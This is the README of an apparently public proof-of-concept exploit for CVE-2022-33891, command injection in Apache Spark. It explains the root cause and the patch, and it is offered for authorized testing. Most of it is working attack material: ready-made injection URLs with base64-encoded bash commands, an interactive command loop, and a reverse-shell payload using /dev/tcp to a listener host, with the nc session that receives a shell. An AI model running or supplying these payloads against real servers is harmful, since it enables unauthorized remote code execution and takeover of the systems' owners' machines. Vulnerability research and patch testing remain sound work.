# CVE-2022-33891
Apache Spark Shell Command Injection Vulnerability

A Python POC for exploiting the Apache Spark Shell Command Injection vulnerability. I saw some other POCs out there but they looked mega sus. This one is clean and simple.

I did not discover this exploit/vulnerability. I just wanted to make a testing tool for the ethical hacking community ^.^

Script by HuskyHacks, optimized for Arch Linux/threat hunting/bug bounty by CyberQueenMeg

CVE originally discovered by  Kostya Kortchinsky from Databricks.

## Affected Versions
Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1

## Vulnerable component
```
http://localhost:8080/?doAs=`[command injection here]`
```
Example
```
http://localhost:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash`
```
... sleeps for 10 seconds

## Usage
```
usage: poc.py [-h] -u URL -p PORT [--revshell] [-lh LISTENINGHOST] [-lp LISTENINGPORT] [--check] [--verbose] --header HEADER

CVE-2022-33891 Python POC Exploit Script

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL to exploit.
  -p PORT, --port PORT  Exploit target's port.
  --revshell            Reverse Shell option.
  -lh LISTENINGHOST, --listeninghost LISTENINGHOST
                        Your listening host IP address.
  -lp LISTENINGPORT, --listeningport LISTENINGPORT
                        Your listening host port.
  --check               Checks if the target is exploitable with a sleep test
  --verbose             Verbose mode
  --header HEADER       Custom header

```

## Examples

Check to see if the target is vulnerable:
```
husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --check --verbose
[*] Attempting to connect to site...
[*] URL request: http://localhost:8080/?doAs='testing'
[*] Response status code: 403
[!] Performing sleep test of 10 seconds...
[*] T1: 2022-07-22 10:47:48.406996
[*] Command is: sleep 10
[*] Base64 command is: c2xlZXAgMTA=
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgMTA= | base64 -d | bash`
[*] Sending exploit...
[*] Response status code: 403
[*] Hint: 403 is good.
[*] T2: 2022-07-22 10:47:58.425108
[*] Delta T: 10
[+] Sleep was 10 seconds! This target is probably vulnerable!
```

Issue commands in a command prompt loop:
```
husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --verbose
[*] "Interactive" mode!
[!] Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.
[cve-2022-33891> sleep 5
[*] Command is: sleep 5
[*] Base64 command is: c2xlZXAgNQ==
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgNQ== | base64 -d | bash`
[*] Sending exploit...
[*] Response status code: 403
[*] Hint: 403 is good.
[cve-2022-33891> 
```

Execute a reverse shell:
```
husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --revshell -lh 10.10.1.237 -lp 9001 --verbose
[*] Reverse shell mode.
[*] Set up your listener by entering the following:
nc -nvlp 9001
[*] When your listener is set up, press enter!
[*] Command is: sh -i >& /dev/tcp/10.10.1.237/9001 0>&1
[*] Base64 command is: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMS4yMzcvOTAwMSAwPiYx
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMS4yMzcvOTAwMSAwPiYx | base64 -d | bash`
[*] Sending exploit...

...[in the other terminal]...

husky@dev-kde:~/Desktop/cve-2022-33891$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 172.19.0.2 52136
sh: 0: can't access tty; job control turned off
$ whoami
spark
$ echo "hackerman"
hackerman
$ 
```

## More Info
The command injection occurs because Spark checks the group membership of the user passed in the `?doAs` parameter by using a raw Linux command. Bash interpolation runs the command, sends the output to the `id` field, and attempts to look up the resulting user.

Passing in `which python` as the value of `?doAs=` user produces this result in the traceback:
```
...
http://localhost:8080/?doAs=`which%20python`
...

spark_1  | 22/07/22 15:15:57 INFO Utils: id: '/opt/bitnami/python/bin/python': no such user
spark_1  | 22/07/22 15:15:57 ERROR Utils: Process List(bash, -c, id -Gn `which python`) exited with code 1: 
spark_1  | 22/07/22 15:15:57 ERROR Utils: Error getting groups for user=`which python`
```
Here, Java has decided it would be best to pass in the `id` command into `bash -c` to check the group membership for a specified user. Problem is, that also allows command injection. Bash interpolation has evaluated the given command and printed the results on line 1 of this output and tries to look up the user by the stdout of the command.

There's no user named `/opt/bitnami/python/bin/python` but that sure as hell means the command was passed to Bash and executed.

Patched versions parametrize this call to have a full path to the `/bin/id` command instead of to `bash -c id`.

It's worth noting that there is nothing reflected back on the page during command execution, so this is blind OS injection. Your commands run, but there will be no indication if they worked or not or even if the program you're running is on the target. For example, the container that is spun up with the `docker-compose.yml` file in this repo does not have ping, so checking for command injection via a pingback will not work. But you won't know that's the case so you'll be left wondering if it worked or not.

The sleep test is a safe bet ^.^

## OPSEC

I spent precisely zero cycles making this OPSEC safe. Red teamers, that's on you.

## Disclaimer
This POC has no passive enumeration capability. The exploit is a blind command injection. If you use this script against a target, you are sending packets to it. Even if you use the `--check` parameter and the target is vulnerable, you are actively exploit it to prove that it's vulnerable.

Don't use this on production systems that are sensitive to testing. Do not use this against targets if you do not have authorization to do so. I'm not even close to liable for how you choose to use this.

Peep the license.

## References
- https://securityonline.info/cve-2022-33891-apache-spark-shell-command-injection-vulnerability/
- https://nvd.nist.gov/vuln/detail/CVE-2022-33891
- https://spark.apache.org/docs/2.1.0/configuration.html
- https://github.com/W01fh4cker/cve-2022-33891 (I do not recommend using this POC)

